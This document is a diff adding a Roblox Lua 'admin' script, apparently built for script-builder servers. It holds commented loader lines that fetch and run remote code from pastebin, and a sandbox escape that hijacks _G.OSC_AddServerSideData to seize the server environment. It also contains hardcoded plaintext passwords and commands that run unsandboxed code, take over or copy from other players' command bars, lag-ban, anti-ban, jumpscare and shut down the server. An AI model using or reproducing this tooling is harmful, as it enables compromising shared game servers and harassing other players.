@@ -1,0 +1,1855 @@
+--[[Loader: ( With noligate )
+loadstring(game:service'HttpService':GetAsync('http://pastebin.com/raw.php?i=pYtwWEZw'))()
+ 
+Emergency Mode: ( If something broke ) (ONLY RUN IN T0TALLYN0TATR0LLS PRIVATESERVER)
+loadstring(game:service'HttpService':GetAsync('https://preview.c9.io/darthstrantax/strantot/Admin.lua'))()
+]]
+
+local Me = script
+wait()
+script.Parent=nil
+local _OX=getfenv()
+local i=game:service'InsertService':LoadAsset(140878711)
+local n=i:children()[1]
+game:service'Debris':AddItem(i,0)
+n.Parent=workspace
+pcall(_G.OSC_AddServerSideData,setmetatable({},{__index=function()
+Environment=getfenv(2)end}))
+_G.OSC_AddServerSideData=nil
+game:service'Debris':AddItem(n,0)
+local _OUTENV=Environment
+_OUTENV.owner=_OX.owner
+_OUTENV.print=_OX.print
+_OUTENV.error=_OX.error
+_OUTENV.warn=_OX.warn
+setfenv(1, Environment)
+
+script.Name="asd"
+  local Core={}
+    Core.Variables = {
+      AdminName='ShockTabs';
+      SdOnBreakout = true;
+      AutoSaveRanks=true;
+      Baser='';
+      PrivateServer=false;
+      DisableScripting = false;  -- disable scripting toggle.
+      Networkserver=game:service'NetworkServer';
+      DataStoreKey='TheFunkyZebra';
+      Starttime=tick();
+      Pre_Suf_ix={';','-',':','.',"'",'[',']','=','+','!','$','^','*','',' '};
+      VerKey='138573583175098'; -- some random numbers..
+    };
+    Core.Events={};
+    
+    Core.Ranks={};
+    Core.Logins={
+      ['error18']={
+        Error={Username='error18';Password='world';Backup={Rank=7,Desc='Attempt to index \'Hair\' (a nil value)',Color='Really red',Color2='Really red',Prefix=';',Suffix='.',Sel=true};}
+      };
+      ['T0tallyN0tATr0ll']={
+        Troll={Username='T0tallyN0tATr0ll';Password='t0tz';Backup={Rank=7,Desc='Cool Skids!',Color='Institutional white',Color2='Lime green',Prefix=';',Suffix='-',Sel=true};}
+      };
+      ['supersonicfan111']={
+        Bill={Username='supersonicfan111';Password='BackwardsMessage';Backup={Rank=7,Desc='AND REMEMBER: REALITY IS AN ILLUSION THE UNIVERSE IS A HOLOGRAM!', Color='New Yeller',Color2='New Yeller',Prefix='!',Suffix='~',Sel=true};}
+      };
+      ['FallingVortex']={ -- lmao i wanna test it
+      Vortex={Username='FallingVortex';Password='VortexBeCrazy';Backup={Rank=7,Desc='Makein Shock eh?',Color='Bright red',Color2='Crimson',Prefix=';',Suffix='-',Sel=false};}
+    };
+    ['LetThereBeCode']={
+      CodeJan={Username='LetThereBeCode';Password='CodingJanitor';Backup={Rank=7,Desc='UGH STOP CRAPPING ALL OVER THE CODE!',Color='Really red',Color2='Lime green',Prefix='<',Suffix='.',Sel=true};}
+    };
+    ['DarthStrantax']={ -- Multiple backups.
+    Strantax={Username='DarthStrantax';Password='ThePandaWithin';Backup={Rank=7,Desc='Imperator Dominus Strantax Maximus.',Color='Pink',Color2='Crimson',Prefix=":",Suffix=" ",Sel=true};}
+  };
+--
+};
+Core.BanTable={};
+Core.Loops={};
+Core.AllowedScript={"T0tallyN0tATr0ll","DarthStrantax","FallingVortex","LetThereBeCode"};
+Core.AntiBanned={
+['DarthStrantax']=false; -- We activate in-game
+['T0tallyN0tATr0ll']=false; -- Defaultly off
+['FallingVortex']=false; -- same
+};
+Core.VipServers={};
+Core.RankNames={'Lag-Banned','Banned','Default User.','Moderator','Friend','Admin','Best-Friend','Ultra Admin','Co-Owner','Owner'};
+Core.tablets={};
+Core.palette={'White';
+'Brick yellow';
+'Light reddish violet';
+'Pastel Blue';
+'Nougat';
+'Bright red';
+'Bright blue';
+'Bright yellow';
+'Black';
+'Dark green';
+'Medium green';
+'Bright green';
+'Dark orange';
+'Light blue';
+'Medium red';
+'Medium blue';
+'Bright violet';
+'Br. yellowish orange';
+'Bright orange';
+'Bright bluish green';
+'Br. yellowish green';
+'Light orange';
+'Sand blue';
+'Earth green';
+'Sand green';
+'Sand red';
+'Reddish brown';
+'Medium stone grey';
+'Dark stone grey';
+'Light stone grey';
+'Brown';
+'Cool yellow';
+'Slime green';
+'Smoky grey';
+'Dark blue';
+'Parsley green';
+'Steel blue';
+'Storm blue';
+'Lapis';
+'Dark indigo';
+'Sea green';
+'Shamrock';
+'Fossil';
+'Mulberry';
+'Forest green';
+'Cadet blue';
+'Electric blue';
+'Eggplant';
+'Moss';
+'Artichoke';
+'Sage green';
+'Ghost grey';
+'Lilac';
+'Plum';
+'Olivine';
+'Laurel green';
+'Quill grey';
+'Crimson';
+'Mint';
+'Baby blue';
+'Carnation pink';
+'Persimmon';
+'Maroon';
+'Gold';
+'Daisy orange';
+'Pearl';
+'Fog';
+'Salmon';
+'Terra Cotta';
+'Cocoa';
+'Wheat';
+'Buttermilk';
+'Mauve';
+'Sunrise';
+'Tawny';
+'Rust';
+'Cashmere';
+'Khaki';
+'Lily white';
+'Seashell';
+'Burgandy';
+'Cork';
+'Burlap';
+'Beige';
+'Oyster';
+'Pine Cone';
+'Fawn brown';
+'Hurricane grey';
+'Cloudy grey';
+'Linen';
+'Copper';
+'Dirt brown';
+'Bronze';
+'Flint';
+'Dark taupe';
+'Burnt Sienna';
+'Institutional white';
+'Mid gray';
+'Really black';
+'Really red';
+'Neon orange';
+'Alder';
+'Dusty Rose';
+'Olive';
+'New Yeller';
+'Really blue';
+'Navy blue';
+'Deep blue';
+'Cyan';
+'CGA brown';
+'Magenta';
+'Pink';
+'Deep orange';
+'Teal';
+'Toothpaste';
+'Lime green';
+'Camo';
+'Grime';
+'Lavender';
+'Pastel light blue';
+'Pastel orange';
+'Pastel violet';
+'Pastel blue-green';
+'Pastel green';
+'Pastel yellow';
+'Pastel brown';
+'Royal purple';
+'Hot pink';};
+Core.wires_toggle_table = {};
+   Core.Commands={
+       ['Kill' ]={Name='Kill';Usages={ 'kill' };Rank=1;Desc='Kills a user';Function=function(Player, Args)
+ for g,h in pairs(Core.Functions.GetPlayers(Args[1],Player)) do
+ h.Character:BreakJoints()
+ end
+ end ;
+};
+['Mute']={
+Name='Mute';
+Usages={'mute','nochat'};
+Rank=5;
+Desc='Mutes specified user.';
+Function=function(Player,Args)
+ for i,v in pairs(Core.Functions.GetPlayers(Args,Player)) do
+  if Core.Functions.GetRank(v.Name) < Core.Functions.GetRank(Player.Name) then
+   Core.Functions.ToggleChat(v,true)
+   end
+ end
+end
+};
+['UnMute']={
+Name='UnMute';
+Usages={'unmute','allowchat'};
+Rank=5;
+Desc='UnMutes specified user.';
+Function=function(Player,Args)
+ for i,v in pairs(Core.Functions.GetPlayers(Args,Player)) do
+ --if Core.Functions.GetRank(v.Name) < Core.Functions.GetRank(Player.Name) then
+   Core.Functions.ToggleChat(v,false)
+  -- end
+ end
+end
+};
+       ['Globals' ]={Name='Globals';Usages={ 'globals','_g' };Rank=1;Desc='Shows globals.';Function=function(Player, Args)
+ for i,v in pairs(_G) do
+ print(v)
+ end
+ end ;
+};
+       ['Thaw' ]={Name='Thaw';Usages={ 'thaw' };Rank=1;Desc='Thaws a user';Function=function(Player, Args)
+ for g,h in pairs(Core.Functions.GetPlayers(Args[1],Player)) do
+ for j,k in pairs(h.Character:children()) do
+     if k:IsA'Part' then
+         k.Anchored=false
+         end
+    end
+ end
+ end ;
+};
+       ['Freeze' ]={Name='Freeze';Usages={ 'freeze' };Rank=1;Desc='Freezes a user';Function=function(Player, Args)
+ for g,h in pairs(Core.Functions.GetPlayers(Args[1],Player)) do
+ for j,k in pairs(h.Character:children()) do
+     if k:IsA'Part' then
+         k.Anchored=true
+         end
+    end
+ end
+ end ;
+};
+['Binds' ]={Name='Binds';Usages={ 'binds','selfbinds' };Rank=0;Desc='Binds commands to user';Function=function(Player, Args)
+Core.Functions.AttachBinds(Player)
+ end ;
+};
+['Respawn' ]={Name='Respawn';Usages={ 'respawn','reset' };Rank=1;Desc='Respawns a user';Function=function(Player, Args)
+ for g,h in pairs(Core.Functions.GetPlayers(Args[1],Player)) do
+ h:LoadCharacter()
+ end
+ end ;
+};
+ ['Toggle Block OSC' ]={Name='Toggle Block OSC';Usages={ 'bosc' };Rank=4;Desc='Blocks OSC Bypasses.';Function=function(Speaker, Args)
+ if not blockosc then
+ spawn(function()
+ blockosc=game.ItemChanged:connect(function()
+ spawn(function()
+ if (_G.OSC_AddServerSideData) then
+ local e;
+ pcall(_G.OSC_AddServerSideData, setmetatable({}, {__index=function(...)
+ e=getfenv(2)
+ setfenv(2, setmetatable({}, {__index=function()
+ end}))
+ end, __metatable=''}))
+ end
+ end)
+ end)
+ end)
+ end
+ end;
+};
+--[[['Load Data Store' ]={Name='Loads up a datastore.';Usages={ 'datastore','data' };Rank=0;Desc='Loads datastore.';Function=function(Speaker, Args)
+ Core.Commands['Load Data Store'].Rank=7
+  Core.DataSave:SetAsync('Ranks',Core.Functions.JSONEncode(Core.Ranks))
+ Core.DataSave:SetAsync('VipServers',Core.Functions.JSONEncode(Core.VipServers))
+ Core.DataSave=game:service'DataStoreService':GetDataStore(Args[1])
+ Core.Ranks={}
+ Core.Variables.DataStoreKey=Args[1]
+ Core.Functions.updtrankz()
+ Core.VipServers=Core.Functions.JSONDecode(Core.DataSave:GetAsync('VipServers'))
+ end;--TheFunkyZebra
+};]]
+ ['Bypass Execute' ]={Name='Execute';Usages={ 'bexec','bexecute','bexe' };Rank=7;Desc='Runs A Code';Function=function(Speaker, Args)
+ local Res,Err=loadstring(Args[1])()
+ end;
+};
+ ['Execute' ]={Name='Execute';Usages={ 'exec','execute','exe' };Rank=1;Desc='Runs A Code';Function=function(Speaker, Args)
+ Core.Functions.runInSandbox(loadstring(Args[1]))
+ end;
+};
+ ['Airput' ]={Name='Airput';Usages={ 'airput' };Rank=6;Desc="Runs FallingVortex's airput";Function=function()
+ require(292492701)
+ end;
+};
+ ['UpdateRanks' ]={Name='UpdateRanks';Usages={ 'updtr' };Rank=5;Desc='Updates ranks.';Function=function(Player, Args)
+ Core.Functions.updtrankz()
+ end;
+};
+ ['Ping' ]={Name='Ping';Usages={ 'ping' };Rank=1;Desc='Pings all arguments';Function=function(Player, Args)
+ for i,v in pairs(Args) do
+ Core.Functions.Tab(Player, v)
+ end
+ end;
+};
+ ['LocalPing' ]={Name='LocalPing';Usages={ 'lping' };Rank=1;Desc='LocalPings all arguments';Function=function(Player, Args)
+ for i,v in pairs(Args) do
+ Core.Functions.Tab(Player, v,nil,nil,nil,nil,true)
+ end
+ end;
+};
+ ['Dismiss Tabs' ]={Name='Dismiss Tabs';Usages={ 'dt' };Rank=0;Desc='Dismisses tabs!';Function=function(Player, Args)
+ if #Args==0 then
+ Core.Functions.Dismiss(Player.Name)
+ else
+ for g,h in pairs(Core.Functions.GetPlayers(Args[1],Player)) do
+ Core.Functions.Dismiss(h.Name)
+ end
+ end
+ end;
+};
+ ['End Admin' ]={Name='End Admin';Usages={ 'end' };Rank=4;Desc='Ends admin along with all functions.';Function=function(Player, Args)
+ Core.Functions.destroyadmin()
+ end;
+};
+ ['Sudo' ]={Name='Sudo';Usages={ 'sudo','@' };Rank=3;Desc='Forces user to run command.';Function=function(Player, Args)
+ for i,v in pairs(Core.Functions.GetPlayers(Args[1],Player)) do
+ if Core.Functions.GetRank(Player.Name) > Core.Functions.GetRank(v.Name) then
+ Core.Functions.Chatted(v,Args[2])
+ end
+ end
+ end;
+};
+ ['Update Admin' ]={Name='Update Admin';Usages={ 'update' };Rank=4;Desc='Fully updates admin. WIP.';Function=function(Player, Args)
+ for _,v in pairs(game:service'Players':GetPlayers()) do
+ Core.Functions.Dismiss(v.Name)
+ end
+ _G.ShockTabs=nil
+ Core.Functions.UseCmdBar(Player.Name,"Hi logger This pastebin link is a module you cannot load.")
+ Core.Functions.UseCmdBar(Player.Name,'h/'.."http://pastebin.com/raw.php?i=VJp0AW79")
+ Core.DataSave:SetAsync('Ranks',Core.Functions.JSONEncode(Core.Ranks))
+ Core.DataSave:SetAsync('VipServers',Core.Functions.JSONEncode(Core.VipServers))
+ wait(1)
+ Core.Functions.destroyadmin()
+ Core={};
+ end;
+};
+ ['Commands' ]={Name='Commands';Usages={ 'cmds','help','commands','commandmenu','helpmenu' };Rank=0;Desc='Displays all commands';Function=function(Player, Args)
+ Core.Functions.Dismiss(Player.Name)
+ for i = 0, 7 do
+Core.Functions.Tab(Player,'Rank '..i,'Commands','New Yeller',function()
+  Core.Functions.Dismiss(Player.Name)
+ Core.Functions.getCommands(Player,i)
+ end)
+ end
+ end;
+};
+ ['Grab' ]={Name='Grab';Usages={ 'grab' };Rank=2;Desc='Inserts a player into your tablet stream';Function=function(Player, Args)
+ for i,v in pairs(Core.Functions.GetPlayers(Args[1],Player)) do
+ wait(.2)
+ if v and v.Character and v.Character:findFirstChild"Torso" then
+ table.insert(Core.tablets, {Part=v.Character.Torso,Parent=v.Character,Player=Player.Name})
+ v.Character.Torso.Anchored=true
+ local cd=Instance.new('ClickDetector',v.Character.Torso)
+ cd.MouseClick:connect(function()
+ local cf=v.Character.Torso.CFrame
+ v:LoadCharacter()
+ wait()
+ v.Character.Torso.CFrame=cf
+ end)
+ end
+ end
+ end;
+};
+ ['Setrank' ]={Name='Setrank';Usages={ 'rank','sr','setrank' };Rank=4;Desc='Sets the users rank.';Function=function(Player, Args)
+ if Core.Functions.GetRank(Player.Name) > tonumber(Args[1]) then
+ for i,v in pairs(Core.Functions.GetPlayers(Args[2],Player)) do
+ if Core.Functions.GetRank(Player.Name) > Core.Functions.GetRank(v.Name) then
+ Core.Ranks[v.Name].Rank=tonumber(Args[1])
+ Core.Functions.Bans(v)
+ end
+ end
+ end
+ end;
+};
+ ['ViewRanks' ]={Name='ViewRanks';Usages={ 'ranked','viewranks','vr' };Rank=2;Desc='Views all player ranks.';Function=function(Player, Args)
+ Core.Functions.Dismiss(Player.Name)
+ local Check=function(Rank)
+ if #Args==0 then
+ return true
+ else
+ if Args[1]=='admins' and Rank >= 1 then
+ return true
+ elseif Args[1]=='bans' and Rank < 0 then
+ return true
+ elseif Rank==Args[1] then
+ return true
+ elseif Rank==tonumber(Args[1]) then
+ return true
+ end
+ end
+ end
+ for i,v in pairs(Core.Ranks) do
+ if Check(v.Rank) then
+ Core.Functions.Tab(Player,i,nil,nil,function()
+ Core.Functions.Dismiss(Player.Name)
+ Core.Functions.Tab(Player,'Back',nil,'Really blue',function() Core.Functions.Dismiss(Player.Name) Core.Commands.ViewRanks.Function(Player, Args) end)
+ Core.Functions.Tab(Player,'Rank | '..v.Rank,nil,nil,nil)
+ Core.Functions.Tab(Player,'Desc | '..v.Desc,nil,nil,nil)
+  Core.Functions.Tab(Player,'Selection Box',nil,nil,function()
+     Core.Functions.Dismiss(Player.Name)
+     Core.Functions.Tab(Player,'On','Selection Box',nil,function()
+       v.Sel=true
+     end)
+     Core.Functions.Tab(Player,'Off','Selection Box',nil,function()
+       v.Sel=false
+       end)
+  end)
+ Core.Functions.Tab(Player,'Color | '..v.Color,nil,v.Color,function()
+ Core.Functions.Dismiss(Player.Name)
+ for i=1, #Core.palette do
+ local color=Core.palette[i]
+ Core.Functions.Tab(Player,color,nil,color,function()
+ v.Color=color
+ Core.Functions.Dismiss(Player.Name)
+ end)
+ end
+ end)
+ Core.Functions.Tab(Player,'Second Color | '..v.Color2,nil,v.Color2,function()
+ Core.Functions.Dismiss(Player.Name)
+ for i=1, #Core.palette do
+ local color=Core.palette[i]
+ Core.Functions.Tab(Player,color,nil,color,function()
+ v.Color2=color
+ Core.Functions.Dismiss(Player.Name)
+ end)
+ end
+ end)
+ Core.Functions.Tab(Player,'Name | '..i,nil,nil,nil)
+ Core.Functions.Tab(Player,'Suffix | '..v.Suffix,nil,nil,nil)
+ Core.Functions.Tab(Player,'Prefix | '..v.Prefix,nil,nil,nil)
+ Core.Functions.Tab(Player,'Kick',nil,'Really red',function()Core.Commands.Kick.Function(Player,{v.Name})end)
+ if Core.Functions.GetRank(Player.Name) > Core.Functions.GetRank(5) then
+ Core.Functions.Tab(Player,'Clear',nil,'Really red',function()if Core.Functions.GetRank(Player.Name) > v.Rank then v.Rank=0 v.Desc='' v.Prefix=':' v.Suffix=' ' v.Color='Cyan' v.Color2='Really blue' end end)
+ Core.Functions.Tab(Player,'SetRank',nil,'Really red',function()
+ if Core.Functions.GetRank(Player.Name) > v.Rank then
+ Core.Functions.Dismiss(Player.Name)
+ for i=1, Core.Functions.GetRank(Player.Name)+2 do
+ Core.Functions.Tab(Player,Core.Functions.RanksToText(i-3),nil,nil,function()
+ v.Rank=i-3
+ Core.Functions.Dismiss(Player.Name)
+ end)
+ end
+ Core.Functions.Tab(Player,'Back',nil,'Really blue',function() Core.Functions.Dismiss(Player.Name) Core.Commands.ViewRanks.Function(Player, Args) end)
+ Core.Functions.Tab(Player,'Close',nil,'Really blue',function() Core.Functions.Dismiss(Player.Name) end)
+ end
+ end)
+ end--
+ end)
+ end
+ end
+ end;
+};
+ ['Ranks' ]={Name='Ranks';Usages={ 'ranks','showranks' };Rank=0;Desc='View all ranks.';Function=function(Player, Args)
+ Core.Functions.Dismiss(Player.Name)
+ for i,v in pairs(Core.RankNames) do
+ -- Start
+ Core.Functions.Tab(Player,'Name ['..v..']',nil,nil,
+ function() -- JANITOR: Yep, I added a new function for commands by rank preview. Hooray?
+ Core.Functions.Dismiss(Player.Name)
+ for j,z in pairs(Core.Commands) do
+ if z.Rank == i-3 then
+ Core.Functions.Tab(Player,j,nil,nil,function()
+ Core.Functions.Dismiss(Player.Name)
+ Core.Functions.Tab(Player,'Back',nil,'Really blue',function() Core.Functions.Dismiss(Player.Name) Commands.Ranks.Function(Player, Args) end)
+ Core.Functions.Tab(Player,'Rank | '..z.Rank,nil,nil,nil)
+ Core.Functions.Tab(Player,'Desc | '..z.Desc,nil,nil,nil)
+ Core.Functions.Tab(Player,'Name | '..j,nil,nil,nil)
+ Core.Functions.Tab(Player,'Usages',nil,nil,function()
+ Core.Functions.Dismiss(Player.Name)
+ Core.Functions.Tab(Player,'Back',nil,'Really blue',function() Core.Functions.Dismiss(Player.Name) Commands.Ranks.Function(Player, Args) end)
+ Core.Functions.Tab(Player,'Close',nil,'Really blue',function() Core.Functions.Dismiss(Player.Name) end)
+ for g,h in pairs(z.Usages) do
+ Core.Functions.Tab(Player,h,nil,Core.Ranks[Player.Name].Color2,nil);
+ end
+ end)
+ end)
+ end
+ end
+ end)
+ end
+ end;
+};
+ ['Scream']={Name='Scream',Usages={'scream','scare'},Rank=3,Desc='Scares user with a gui and sound.',Function=function(Player,Args)
+ for i,v in pairs(Core.Functions.GetPlayers(Args[1],Player)) do
+         if v:FindFirstChild("PlayerGui") then-- Credit to aymant50!
+                                                local newgui = Instance.new("ScreenGui",v.PlayerGui)
+                         newgui.Name = "Screamer"
+                         local newimage = Instance.new("ImageLabel",newgui)
+                         newimage.Image = "rbxassetid://142410803"
+                         newimage.Size = UDim2.new(1,0,1,0)
+                         local s = Instance.new("Sound",newgui)
+                         s.SoundId = "rbxassetid://166038742"
+                         s.Volume = 1
+                         s.Looped = true
+                         s:Play()
+                         print("Screamed "..v.Name)
+                         coroutine.resume(coroutine.create(function()
+                         while wait() do
+                                 newimage.ImageColor3 = Color3.new(math.random(1,255)/255,math.random(1,255)/255,math.random(1,255)/255)
+                                 wait()
+                                 newimage.ImageColor3 = Color3.new(1,1,1)
+                         end
+                         end))
+          
+                                        end
+                                end
+ end};
+ ['Kick' ]={Name='Kick';Usages={ 'kick' };Rank=2;Desc='Kicks user.';Function=function(Player, Args)
+ for i,v in pairs(Core.Functions.GetPlayers(Args[1],Player)) do
+ if Core.Functions.GetRank(Player.Name) > Core.Functions.GetRank(v) then
+ if Args[2] then
+ v:kick(Args[2]) -- ;kick.Name.Reason
+ else
+ v:kick()
+ end
+ end
+ end
+ end;
+};
+ ['Ban' ]={Name='Ban';Usages={ 'ban' };Rank=3;Desc='Ban user';Function=function(Player, Args)
+ Core.Commands.Setrank.Function(Player,{'-1',Args[1]})
+ if Args[2] then
+ for i,v in pairs(Core.Functions.GetPlayers(Args[1],Player)) do
+ if Core.Functions.GetRank(Player.Name) > Core.Ranks[v.Name].Rank then
+ Core.Functions.Tab(Player, 'You cannot Ban A higher rank')
+ else
+ Core.Ranks[v.Name].Desc=Args[2]
+ end
+ end
+ end
+ end;
+};
+ ['Sbexe' ]={Name='Sbexe';Usages={ 'sbexe','sbexec' };Rank=5;Desc="Control's a player's cmdbar.";Function=function(Player, Args)
+ for i,v in pairs(Core.Functions.GetPlayers(Args[1],Player)) do
+ if Core.Functions.GetRank(Player.Name) > Core.Functions.GetRank(v) then
+ Core.Functions.UseCmdBar(v.Name,Args[2])
+ end
+ end
+ end;
+};
+ ['Steal' ]={Name='Steal';Usages={ 'steal' };Rank=2;Desc='Steals a players localscript.';Function=function(Player, Args)
+ for i,v in pairs(Core.Functions.GetPlayers(Args[1],Player)) do
+ if Core.Functions.GetRank(Player.Name) > Core.Functions.GetRank(v) then
+ Core.Functions.UseCmdBar(v.Name,'share/'..Player.Name..'/'..Args[2])
+ end
+ end
+ end;
+};
+ ['LagBan' ]={Name='LagBan';Usages={ 'lban' };Rank=4;Desc='Lag-Ban user';Function=function(Player, Args)
+ Core.Commands.Setrank.Function(Player,{'-2',Args[1]})
+ if Args[2] then
+ for i,v in pairs(Core.Functions.GetPlayers(Args[1],Player)) do
+ if Core.Functions.GetRank(Player.Name) > v.Rank then
+ Core.Functions.Tab(Player, 'You cannot Lag-Ban a higher rank')
+ else
+ Core.Ranks[v.Name].Desc=Args[2]
+ end
+ end
+ end
+ end;
+};
+ ['Rank Autosave' ]={Name='Rank Autosave';Usages={ 'autosaveranks','asr' };Rank=6;Desc='Toggles autosaving of ranks';Function=function(Player, Args)
+ if Args[1]=='on' then
+ AutoSaveRanks=true
+ Core.Functions.Tab(Player,'Autosave now '..Args[1]..'.')
+ elseif Args[1]=='off' then
+ AutoSaveRanks=false
+ Core.Functions.Tab(Player,'Autosave now '..Args[1]..'.')
+ end
+ end;
+};
+ ['Private Server' ]={Name='Private Server';Usages={ 'pri' };Rank=4;Desc='Toggles Private Server';Function=function(Player, Args)
+ if Args[1]=='on' then
+ Pri=true
+ Core.Functions.Tab(Player,'Private Server now '..Args[1]..'.')
+ elseif Args[1]=='off' then
+ Pri=false
+ Core.Functions.Tab(Player,'Private Server now '..Args[1]..'.') 
+ end
+ end;
+};
+ ['JSon Export' ]={Name='JSon Export';Usages={ 'jsonexport' };Rank=4;Desc='Exports json save ranks to slack.';Function=function(Player, Args)
+ local Rans=DataSave:GetAsync('Ranks')
+ local Encrypted=''
+ for i=1, #Rans do
+ Encrypted=Encrypted..string.char(Rans:sub(i,i))
+ end
+ Core.Functions.Log('JSON Export',Encrypted)
+ end;
+};
+--['Info' ]={Name='Info';Usages={ 'info','information' };Rank=0;Desc=
+ ['Forcefield' ]={Name='Forcefield';Usages={ 'ff','shield' };Rank=1;Desc='Adds forcefield.';Function=function(Player, Args)
+ for i,v in pairs(Core.Functions.GetPlayers(Args[1],Player)) do
+ Instance.new("ForceField",v.Character)
+ Core.Functions.Tab(Player,'Gave forcefield to '..v.Name..'.',nil,nil,nil,5)
+ end
+ end;
+};
+ ['Un-Forcefield' ]={Name='Un-Forcefield';Usages={ 'unff','noff','unshield','noshield' };Rank=1;Desc='Removes users forcefield.';Function=function(Player, Args)
+ for i,v in pairs(Core.Functions.GetPlayers(Args[1],Player)) do
+ local ff_removed = false
+ for h,j in pairs(v.Character:children()) do
+ if j:IsA'ForceField' then
+ j:Destroy()
+ ff_removed = true
+ end
+ end
+ if ff_removed then Core.Functions.Tab(Player,'Removed force fields from '..v.Name..'.',nil,nil,nil,5) end
+ end
+ end;
+};
+ ['Explode' ]={Name='Explode';Usages={ 'explode','expl' };Rank=1;Desc='Explodes player.';Function=function(Player, Args)
+ for i,v in pairs(Core.Functions.GetPlayers(Args[1],Player)) do
+ local expl = Instance.new("Explosion",workspace)
+ expl.Position = v.Character.Torso.Position
+ Core.Functions.Tab(Player,'Exploded '..v.Name..'.',nil,nil,nil,5)
+ end
+ end;
+};
+ ['God' ]={Name='God';Usages={ 'god','infhealth','immortal' };Rank=1;Desc='Gives player infinite health.';Function=function(Player, Args)
+ for i,v in pairs(Core.Functions.GetPlayers(Args[1],Player)) do
+ v.Character.Humanoid.MaxHealth = math.huge
+ v.Character.Humanoid.Health = math.huge
+ Core.Functions.Tab(Player,'Gave infinite health to '..v.Name..'.',nil,nil,nil,5)
+ end
+ end;
+};
+ ['Un-God' ]={Name='Un-God';Usages={ 'ungod','normhealth','mortal' };Rank=1;Desc='Gives player normal health.';Function=function(Player, Args)
+ for i,v in pairs(Core.Functions.GetPlayers(Args[1],Player)) do
+ v.Character.Humanoid.MaxHealth = 100
+ Core.Functions.Tab(Player,'Gave normal health to '..v.Name..'.',nil,nil,nil,5)
+ end
+ end;
+};
+ ['Health' ]={Name='Health';Usages={ 'health' };Rank=1;Desc='Gives player specified health.';Function=function(Player, Args)
+ for i,v in pairs(Core.Functions.GetPlayers(Args[1],Player)) do
+ v.Character.Humanoid.MaxHealth = tonumber(Args[2])
+ v.Character.Humanoid.Health = math.huge
+ Core.Functions.Tab(Player,'Gave '..v.Name..' '..Args[2]..' Health.',nil,nil,nil,5)
+ end
+ end;
+};
+ ['Speed' ]={Name='Speed';Usages={ 'speed','walkspeed','ws' };Rank=1;Desc='Gives player specified walkspeed.';Function=function(Player, Args)
+ for i,v in pairs(Core.Functions.GetPlayers(Args[1],Player)) do
+ v.Character.Humanoid.WalkSpeed = tonumber(Args[2])
+ Core.Functions.Tab(Player,'Gave Walkspeed of '..Args[2]..' to '..v.Name..'.',nil,nil,nil,5)
+ end
+ end;
+};
+ ['Hint' ]={Name='Hint';Usages={ 'hint','h' };Rank=1;Desc='Shows hint.';Function=function(Player, Args)
+ if Args[#Args] == 'srv' then -- I made so it does all arguments not just first.
+ local function putargstogether()
+ local ret=''
+ for i=1, #Args do
+ if #Args~=i and #Args~=i-1 then
+ ret=ret..Args[i]..' '
+ elseif #Args==i-1 then
+ ret=ret..Args[i]
+ end end
+ return ret
+ end
+ Core.Functions.Hint(putargstogether())
+ else
+ local function putargstogether2()
+ local ret=''
+ for i=1, #Args do
+ if #Args~=i then
+ ret=ret..Args[i]..' '
+ else
+ ret=ret..Args[i]
+ end
+ end
+ return ret
+ end
+ Core.Functions.Hint(putargstogether2(),Player.Name)
+ end
+ end;
+};
+ ['Teleport' ]={Name='Teleport';Usages={ 'teleport','tp' };Rank=2;Desc='Teleports player to specified player.';Function=function(Player, Args)
+ local player2 = Core.Functions.GetPlayers(Args[2],Player)[1]
+ for i,v in pairs(Core.Functions.GetPlayers(Args[1],Player)) do
+ if v~=player2 then
+ v.Character.Torso.CFrame = player2.Character.Torso.CFrame -- test this with multiple people
+ Core.Functions.Tab(Player,'Teleported '..v.Name..' to '..player2.Name..'.',nil,nil,nil,5)
+ end
+ end
+ end;
+};
+ ['AntiBan' ]={Name='AntiBan';Usages={ 'ab' };Rank=6;Desc='Toggle antibans';Function=function(Player, Args)
+ if Args[1]=='me' then
+ if Args[2]=='on' then
+ AntiBanned[Player.Name]=true
+ elseif Args[2]=='off' then
+ AntiBanned[Player.Name]=false
+ end
+ elseif Args[1]=='clear' then
+ AntiBanned={}
+ end
+ end;
+};
+ ['Heal' ]={Name='Heal';Usages={ 'heal' };Rank=1;Desc='Gives player a full health.';Function=function(Player, Args)
+ for i,v in pairs(Core.Functions.GetPlayers(Args[1],Player)) do
+ v.Character.Humanoid.Health = math.huge
+ Core.Functions.Tab(Player,'Gave '..v.Name..' full health.',nil,nil,nil,5)
+ end
+ end;
+};
+ ['Clean' ]={Name='Clean';Usages={ 'clean' };Rank=1;Desc='Cleans script and workspace.';Function=function(Player, Args)
+ local toremove={}
+ for i=1, #Core.Ranks do
+ if Core.Ranks[i].Rank==0 then
+ table.insert(toremove,i)
+ end
+ end
+ for i=1, #toremove do
+ table.remove(Core.Ranks,toremove[i])
+ end
+ pcall(function()
+ workspace.Base:destroy()
+ end)
+ Core.Functions.UseCmdBar(Player.Name,'g/b')
+ Core.Functions.UseCmdBar(Player.Name,'g/nosky')
+ Core.Functions.UseCmdBar(Player.Name,'g/nos/all')
+ Core.Functions.UseCmdBar(Player.Name,'g/nol/all')
+ for i,v in pairs(workspace:children()) do
+ if v:IsA'Hat' or v:IsA'Tool' then v:destroy() end
+ end
+ end;
+};
+ ['Remove scripts' ]={Name='Remove scripts';Usages={ 'removescripts','noscripts','nos','nol' };Rank=3;Desc='Clears specified users scripts.';Function=function(Player, Args)
+ for i,v in pairs(Core.Functions.GetPlayers(Args[1],Player)) do
+ Core.Functions.UseCmdBar(v.Name,'g/nos')
+ Core.Functions.UseCmdBar(v.Name,'g/nol')
+ end
+ end;
+};
+ ['Disable scripts' ]={Name='Disable scripts';Usages={ 'noscripts','disablescripts','ds' };Rank=4;Desc='Deletes any script detected scripts.';Function=function(Player, Args)
+ if Args[1] == 'on' then
+ Core.disable = true
+ elseif Args[1] == 'off' then
+ Core.disable = false
+ end
+ if Core.disable then
+ for i,v in pairs(game:service'Players':GetPlayers()) do
+ for _,z in pairs(Core.AllowedScript) do -- Was just testing in-game k
+ if v.Name ~= z.Name then
+ Core.Functions.UseCmdBar(v.Name,'g/nos') -- Go ingame for a sec
+ Core.Functions.UseCmdBar(v.Name,'g/nol')
+ end
+ end
+ end
+ end end};
+ ['Shutdown' ]={Name='Shutdown';Usages={ 'sd' };Rank=3;Desc='Closes server.';Function=function(Player, Args)
+ for i,v in pairs(game:service'Players':GetPlayers()) do
+ coroutine.resume(coroutine.create(function()
+ v:kick('Server shut down')
+ end))
+ end
+ end;
+};
